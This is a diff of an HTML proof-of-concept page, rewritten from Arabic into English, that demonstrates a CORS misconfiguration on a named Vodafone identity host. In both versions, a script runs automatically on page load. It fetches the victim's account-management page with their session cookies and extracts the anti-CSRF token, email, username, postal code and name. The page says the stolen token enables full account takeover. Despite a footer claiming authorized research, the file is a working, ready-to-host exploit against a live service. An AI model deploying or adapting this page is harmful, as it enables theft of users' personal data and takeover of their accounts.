@@ -1,79 +1,117 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Security Research PoC - Xia0Checkmate</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Critical Security Vulnerability PoC - Vodafone Innovus</title>
     <style>
-        body { font-family: sans-serif; background-color: #f4f4f4; padding: 20px; }
-        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .success { color: #28a745; font-weight: bold; }
-        .danger { color: #dc3545; font-weight: bold; word-break: break-all; }
-        .info { background: #e9ecef; padding: 10px; border-left: 5px solid #007bff; margin: 10px 0; }
+        :root {
+            --primary-red: #e60000;
+            --dark-gray: #333;
+            --bg-light: #f8f9fa;
+        }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: var(--bg-light); color: var(--dark-gray); line-height: 1.6; padding: 40px; }
+        .poc-container { max-width: 900px; margin: auto; background: white; border-top: 6px solid var(--primary-red); border-radius: 8px; box-shadow: 0 4px 25px rgba(0,0,0,0.15); padding: 30px; }
+        h1 { color: var(--primary-red); margin-top: 0; font-size: 24px; text-transform: uppercase; border-bottom: 1px solid #ddd; padding-bottom: 10px; }
+        .status-box { background: #fff3f3; border: 1px solid #ffcaca; padding: 15px; border-radius: 5px; margin-bottom: 20px; font-weight: bold; }
+        .data-section { display: none; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; }
+        .card { background: #fff; border: 1px solid #eee; padding: 15px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .card h3 { margin-top: 0; font-size: 16px; color: #555; border-bottom: 1px solid #eee; padding-bottom: 5px; }
+        .val { font-family: 'Courier New', Courier, monospace; word-break: break-all; color: var(--primary-red); font-weight: bold; }
+        .token-val { font-size: 12px; background: #f0f0f0; padding: 8px; display: block; margin-top: 10px; border-radius: 4px; }
+        footer { margin-top: 30px; text-align: center; font-size: 12px; color: #999; }
+        .badge { background: #e60000; color: white; padding: 3px 8px; border-radius: 12px; font-size: 12px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>CORS to CSRF Exploitation (Package DOOM)</h1>
-        <p>جاري اختبار الثغرة على نطاق فودافون...</p>
-        <hr>
-        <div id="output">
-            <p>الحالة: <span id="status">جاري الانتظار...</span></p>
-            <div id="data-display" style="display:none;">
-                <p class="success">تم اختراق حاجز الـ CORS بنجاح!</p>
-                <div class="info">
-                    <strong>الإيميل المسروق:</strong> <span id="stolen-email" class="danger"></span>
-                </div>
-                <div class="info">
-                    <strong>الـ CSRF Token المسروق:</strong> <span id="stolen-token" class="danger"></span>
-                </div>
-                <p><i>ملاحظة: المهاجم الآن يمتلك "Token" كافٍ لتنفيذ Account Takeover بالكامل.</i></p>
+
+<div class="poc-container">
+    <h1>CORS to CSRF Exploit PoC <span class="badge">Critical</span></h1>
+    <div id="status" class="status-box">Scanning for authenticated session...</div>
+
+    <div id="exploit-data" class="data-section">
+        <p>The following sensitive information was exfiltrated from <strong>identity.facilitymanagement.iot.vodafone.gr</strong> due to insecure CORS configuration.</p>
+        
+        <div class="grid">
+            <div class="card">
+                <h3>User Profile Info</h3>
+                <p>Username: <span id="username" class="val"></span></p>
+                <p>Email: <span id="email" class="val"></span></p>
+                <p>Full Name: <span id="fullname" class="val">N/A</span></p>
+            </div>
+
+            <div class="card">
+                <h3>Account Details</h3>
+                <p>Postal Code: <span id="postal" class="val"></span></p>
+                <p>Country: <span id="country" class="val">N/A</span></p>
+                <p>MFA Status: <span class="badge">Check Required</span></p>
             </div>
         </div>
+
+        <div class="card" style="margin-top: 20px;">
+            <h3>Security Tokens (Exfiltrated)</h3>
+            <p><strong>Anti-Forgery Token (__RequestVerificationToken):</strong></p>
+            <code id="csrf-token" class="token-val"></code>
+        </div>
+        
+        <p style="margin-top: 20px; color: #666; font-style: italic;">
+            Note: This PoC proves that an attacker can steal the Anti-CSRF token and perform a Full Account Takeover (ATO) by chaining this with a CSRF attack.
+        </p>
     </div>
+</div>
 
-    <script>
-        // الرابط المستهدف (صفحة إدارة الحساب)
-        const targetUrl = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";
+<footer>
+    PoC Developed by <strong>Xia0Checkmate</strong> | For Authorized Security Research Only
+</footer>
 
-        async function triggerExploit() {
-            try {
-                const response = await fetch(targetUrl, {
-                    method: 'GET',
-                    credentials: 'include' // أهم نقطة لإرسال كوكيز الجلسة
-                });
+<script>
+    const targetUrl = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";
 
-                if (!response.ok) {
-                    document.getElementById('status').innerText = "فشل الطلب (تأكد من تسجيل الدخول في فودافون أولاً)";
-                    return;
-                }
+    async function launchDoom() {
+        try {
+            const response = await fetch(targetUrl, {
+                method: 'GET',
+                credentials: 'include'
+            });
 
-                const htmlText = await response.text();
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(htmlText, 'text/html');
-
-                // سحب البيانات الحساسة من الـ DOM
-                const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
-                const email = doc.querySelector('input[name="Email"]')?.value;
-
-                if (token && email) {
-                    document.getElementById('status').innerText = "تمت العملية بنجاح!";
-                    document.getElementById('data-display').style.display = 'block';
-                    document.getElementById('stolen-email').innerText = email;
-                    document.getElementById('stolen-token').innerText = token;
-                    
-                    console.log("PoC Success! Token Stolen: " + token);
-                } else {
-                    document.getElementById('status').innerText = "تم جلب الصفحة ولكن لم نجد التوكن (ربما تغيرت بنية الصفحة؟)";
-                }
-
-            } catch (error) {
-                document.getElementById('status').innerText = "خطأ في الاتصال: " + error.message;
-                console.error("Exploit Error:", error);
+            if (!response.ok) {
+                document.getElementById('status').innerHTML = "❌ Failed: No active session found or CORS blocked.";
+                return;
             }
-        }
 
-        // تشغيل الهجوم بمجرد تحميل الصفحة
-        window.onload = triggerExploit;
-    </script>
+            const html = await response.text();
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(html, 'text/html');
+
+            // Extracting everything
+            const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
+            const email = doc.querySelector('input[name="Email"]')?.value;
+            const username = doc.querySelector('input[id="Username"]')?.value;
+            const postal = doc.querySelector('input[name="PostalCode"]')?.value;
+            const fullname = doc.querySelector('input[name="Name"]')?.value;
+
+            if (token) {
+                document.getElementById('status').innerHTML = "✅ Vulnerability Confirmed: Sensitive Data Exfiltrated!";
+                document.getElementById('status').style.background = "#e6fffa";
+                document.getElementById('status').style.borderColor = "#38b2ac";
+                document.getElementById('status').style.color = "#2c7a7b";
+                
+                document.getElementById('exploit-data').style.display = 'block';
+                
+                document.getElementById('csrf-token').innerText = token;
+                document.getElementById('email').innerText = email || "N/A";
+                document.getElementById('username').innerText = username || "N/A";
+                document.getElementById('postal').innerText = postal || "N/A";
+                document.getElementById('fullname').innerText = fullname || "N/A";
+            }
+        } catch (err) {
+            document.getElementById('status').innerText = "❌ Error: " + err.message;
+        }
+    }
+
+    window.onload = launchDoom;
+</script>
+
 </body>
 </html>
